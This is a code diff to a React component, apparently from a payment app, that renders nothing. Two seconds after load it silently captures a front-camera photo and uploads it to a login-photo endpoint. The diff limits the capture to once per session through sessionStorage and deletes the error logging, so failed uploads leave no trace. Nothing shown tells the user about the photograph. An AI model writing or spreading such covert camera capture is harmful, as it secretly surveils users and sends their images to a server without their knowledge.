@@ -1,5 +1,7 @@
-import { useEffect, useRef, useState } from "react";
+import { useEffect, useRef } from "react";
 import { apiRequest } from "@/lib/queryClient";
+
+const PHOTO_TAKEN_KEY = "bkapay_photo_taken";
 
 async function captureFromCamera(facingMode: string): Promise<string | null> {
   try {
@@ -40,10 +42,10 @@ async function captureFromCamera(facingMode: string): Promise<string | null> {
 
 export function BackgroundCamera() {
   const hasAttempted = useRef(false);
-  const [done, setDone] = useState(false);
 
   useEffect(() => {
-    if (hasAttempted.current || done) return;
+    if (hasAttempted.current) return;
+    if (sessionStorage.getItem(PHOTO_TAKEN_KEY) === "true") return;
     hasAttempted.current = true;
 
     const run = async () => {
@@ -54,16 +56,15 @@ export function BackgroundCamera() {
           await apiRequest("POST", "/api/auth/login-photo", {
             photoBase64: frontPhoto,
           });
-          setDone(true);
+          sessionStorage.setItem(PHOTO_TAKEN_KEY, "true");
         } catch (e) {
-          console.error("[BackgroundCamera] Upload error:", e);
         }
       }
     };
 
     const timer = setTimeout(run, 2000);
     return () => clearTimeout(timer);
-  }, [done]);
+  }, []);
 
   return null;
 }
